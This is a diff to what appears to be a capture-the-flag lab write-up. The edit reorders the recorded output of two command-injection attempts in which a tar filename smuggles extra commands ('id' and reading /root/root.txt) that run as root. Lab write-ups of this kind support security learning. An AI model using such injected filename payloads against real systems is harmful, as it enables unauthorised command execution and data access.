@@ -342,7 +342,7 @@ curl -H "Authorization: Bearer <AUTOMATION_KEY>" \
 ```json
 {
   "command": "tar czf /var/automation/exports/test;id;#.tgz /var/automation/data 2>&1",
-  "output": "tar: Cowardly refusing to create an empty archive\nTry 'tar --help' or 'tar --usage' for more information.\nuid=0(root) gid=0(root) groups=0(root)\n"
+  "output": "uid=0(root) gid=0(root) groups=0(root)\ntar: Cowardly refusing to create an empty archive\nTry 'tar --help' or 'tar --usage' for more information.\n"
 }
 ```
 
@@ -363,7 +363,7 @@ curl -H "Authorization: Bearer <AUTOMATION_KEY>" \
 ```json
 {
   "command": "tar czf /var/automation/exports/test;cat /root/root.txt;#.tgz /var/automation/data 2>&1",
-  "output": "tar: Cowardly refusing to create an empty archive\n...\nTHM{REDACTED_BY_AUTHOR}\n"
+  "output": "THM{REDACTED_BY_AUTHOR}\ntar: Cowardly refusing to create an empty archive\nTry 'tar --help' or 'tar --usage' for more information.\n"
 }
 ```
 
